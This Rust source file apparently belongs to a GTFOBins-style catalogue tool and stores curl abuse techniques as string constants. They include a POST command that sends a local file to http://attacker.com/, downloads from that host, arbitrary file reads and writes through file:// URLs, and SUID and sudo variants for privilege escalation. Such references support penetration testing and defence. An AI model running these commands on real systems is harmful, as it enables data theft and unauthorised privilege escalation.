
pub static BIN_NAME: &'static str = "curl";
pub static FU_DESC: &'static str = "Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the `@` to send hard-coded data.";
pub static FU_CODE: &'static str = r#"
    
    URL=http://attacker.com/
    LFILE=file_to_send
    curl -X POST -d "@$LFILE" $URL
"#;
pub static FD_DESC: &'static str = "Fetch a remote file via HTTP GET request.";
pub static FD_CODE: &'static str = r#"
    
    URL=http://attacker.com/file_to_get
    LFILE=file_to_save
    curl $URL -o $LFILE
"#;
pub static FW_DESC: &'static str = "The file path must be absolute.";
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    TF=$(mktemp)
    echo DATA >$TF
    curl "file://$TF" -o "$LFILE"
"#;
pub static FR_DESC: &'static str = "The file path must be absolute.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=/tmp/file_to_read
    curl file://$LFILE
"#;
pub static SUID_DESC: &'static str = "Fetch a remote file via HTTP GET request.";
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which curl) .

    URL=http://attacker.com/file_to_get
    LFILE=file_to_save
    ./curl $URL -o $LFILE
"#;
pub static SUDO_DESC: &'static str = "Fetch a remote file via HTTP GET request.";
pub static SUDO_CODE: &'static str = r#"
    
    URL=http://attacker.com/file_to_get
    LFILE=file_to_save
    sudo curl $URL -o $LFILE
"#;
use crate::code::{Code, Tag};
pub static FU: Code<'static> = Code { 
	title: "FU_CODE",
	code: FU_CODE,
	tag: Tag::FU,
};
pub static FD: Code<'static> = Code { 
	title: "FD_CODE",
	code: FD_CODE,
	tag: Tag::FD,
};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
